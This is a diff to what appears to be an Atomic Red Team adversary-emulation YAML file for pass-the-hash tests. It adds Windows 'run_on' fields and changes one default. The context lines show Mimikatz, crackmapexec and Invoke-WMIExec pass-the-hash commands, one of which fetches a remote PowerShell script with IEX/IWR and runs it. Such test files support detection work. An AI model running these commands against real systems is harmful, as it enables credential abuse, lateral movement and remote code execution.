@@ -44,6 +44,8 @@ atomic_tests:
     command: |
       #{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}"
     name: command_prompt
+  run_on:
+  - windows
 - name: crackmapexec Pass the Hash
   auto_generated_guid: eb05b028-16c8-4ad8-adea-6f5b219da9a9
   description: |
@@ -83,6 +85,8 @@ atomic_tests:
     command: |
       #{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}
     name: command_prompt
+  run_on:
+  - windows
 - name: Invoke-WMIExec Pass the Hash
   auto_generated_guid: f8757545-b00a-4e4e-8cfb-8cfb961ee713
   description: |-
@@ -107,9 +111,11 @@ atomic_tests:
     target:
       description: System to run command on
       type: string
-      default: '$env:COMPUTERNAME'
+      default: $env:COMPUTERNAME
   executor:
     command: |-
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}
     name: powershell
+  run_on:
+  - windows
